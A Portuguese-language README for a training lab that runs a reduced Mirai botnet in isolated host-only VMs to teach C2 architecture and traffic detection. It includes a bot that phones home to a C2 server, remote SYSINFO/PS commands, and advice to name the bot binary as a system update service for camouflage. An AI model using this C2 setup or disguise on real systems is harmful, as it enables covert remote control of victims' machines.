## Laboratório Educacional: Mirai Botnet (Safe-Mode)

> AVISO LEGAL: Este software e documentação foram desenvolvidos estritamente para fins EDUCACIONAIS, de PESQUISA e CTF (Capture The Flag). Todas as funcionalidades maliciosas ofensivas (Scanner, DDoS, Brute-force) foram removidas do código fonte original da Mirai. O uso deste material é restrito a laboratórios isolados (air-gapped ou host-only).

### 📋 Sobre o Projeto

Para fins de práticas de laboratório de Cyber Threat Intelligence e Blue Team, utilizamos uma versão modificada ("castrada") da botnet Mirai. O objetivo é estudar a arquitetura de Comando e Controle (C2) e o comportamento de dispositivos IoT comprometidos sem oferecer riscos reais ao ambiente de rede ou à internet.

### 🚫 Módulos Removidos (Safe-Mode)

    ❌ Scanner SYN: Não varre a internet buscando IPs aleatórios.
    ❌ Brute-force Telnet: Não tenta quebrar senhas (admin/admin, root/1234, etc.).
    ❌ Auto-propagação: O bot não possui capacidade de se replicar sozinho.
    ❌ Ataques DDoS: Removidos todos os vetores de ataque (UDP Flood, TCP SYN Flood, HTTP Flood, GRE IP, etc.).

### ✅ Módulos Mantidos (Funcionais)

    ✔️ C2 Real: Servidor TCP puro (Raw Socket).
    ✔️ Protocolo: Implementação fiel do Handshake e Keep-alive (Heartbeat) da Mirai.
    ✔️ Phone Home: O bot se conecta ativamente ao controlador (Reverse Connection).
    ✔️ Comandos: Troca de instruções simples (Shell/Info) em texto claro.
    ✔️ Monitoramento: Integração via API para visualização em Dashboard.

### 🗺️ Topologia do Laboratório

O laboratório deve ser executado em ambiente virtualizado (VirtualBox, VMware ou Proxmox) utilizando Rede Host-Only para garantir isolamento total da internet.

| Função | Hostname Sugerido | IP Sugerido (Host-Only)	 | Papel |
| -------- | ----- | ----------- |----------- |
| Atacante  | mirai-c2  | 192.168.56.10  | C2 Server + API Bridge + Dashboard |
| Vítima   | mirai-bot  | 192.168.56.20  | Dispositivo IoT Infectado (Bot) |
| Rede	| vboxnet0	| 192.168.56.1/24 | Rede Isolada |

### 🛠️ Instalação e Compilação

**Pré-requisitos**

Em ambas as máquinas (Atacante e Vítima), instale as ferramentas básicas de compilação:

```bash
sudo apt update
sudo apt install build-essential python3 python3-pip net-tools
# Opcional: Se for simular arquiteturas reais (MIPS/ARM)
# sudo apt install gcc-mips-linux-gnu gcc-arm-linux-gnueabi
```

### 1. Preparação do Atacante (C2)

No diretório do servidor:

**Script de automação sugerido (setup_c2.sh)**
```bash
gcc c2_server_v2.c -o c2_server
````

### 2. Preparação da Vítima (Bot)

No diretório do bot:

```bash
# Script de automação sugerido (setup_bot.sh)
# O binário pode ser nomeado como um serviço legítimo para camuflagem
gcc bot_safe.c -o system_update_service
```

### 🚀 Roteiro de Execução (Passo a Passo)

#### Atividade 1: Levantando a Infraestrutura (C2)

> Objetivo: Demonstrar a necessidade de uma infraestrutura de comando ativa.

Na VM Atacante, abra o Terminal 1 e inicie o C2 na porta 5555:

```bash
 ./c2_server 5555
 ```

(O servidor ficará em loop aguardando conexões...)

Na VM Atacante, abra o Terminal 2 e inicie a Ponte API:

```bash
 python3 c2_bridge.py
 ```

No navegador (Host ou VM), abra o arquivo c2_dashboard.html.

Verificação: O status deve estar como "Aguardando conexões".

#### Atividade 2: A Infecção (Phone Home)

> Objetivo: Simular o momento em que o dispositivo infectado "liga para casa".

Vá para a VM Vítima.

Execute o malware apontando para o IP do C2:

```bash
 ./system_update_service 192.168.56.10 5555
 ```

**Resultado Imediato:**

    No Terminal do C2: [C2] Novo bot conectado...

    No Dashboard Web: Um novo card aparece com status Online.

#### Atividade 3: Comando e Controle (C2 Loop)

> Objetivo: Operar a botnet manualmente via terminal.

No terminal onde o ./c2_server está rodando:

```bash
Digite l e <ENTER> para listar os bots e obter o ID.

Digite s para selecionar um bot.

    Digite o índice (ex: 0).
```

Envie comandos de reconhecimento:

```bash
    Comando: SYSINFO (Retorna Kernel/OS da vítima).

    Comando: PS (Retorna lista de processos falsos/reais).

    Comando: PING (Testa latência).
```

#### Atividade 4: Análise de Tráfego (Blue Team)

> Objetivo: Interceptar e analisar a comunicação não criptografada.

Abra um terminal extra (pode ser na VM Atacante ou Vítima) e execute o sniffer:

```bash
# Substitua eth0 pela interface correta da rede Host-Only
sudo tcpdump -i eth0 -nn -A port 5555
```

O que observar:

- O handshake inicial contendo HELLO.
- Os comandos SYSINFO ou PS trafegando em texto claro (cleartext).
    
> Discussão: Por que o uso de texto claro favorece a performance em IoTs baratos, mas facilita a criação de assinaturas de detecção (IDS/IPS)?

### 🛑 Encerramento (Kill Switch)

Para limpar o laboratório e matar todos os processos órfãos:

Na VM Atacante:

```bash
killall -9 c2_server python3
```

Na VM Vítima:

```bash
killall -9 system_update_service
```

Laboratório desenvolvido por BlackALT para Curso de Formação em CTI e Resposta a Incidentes.
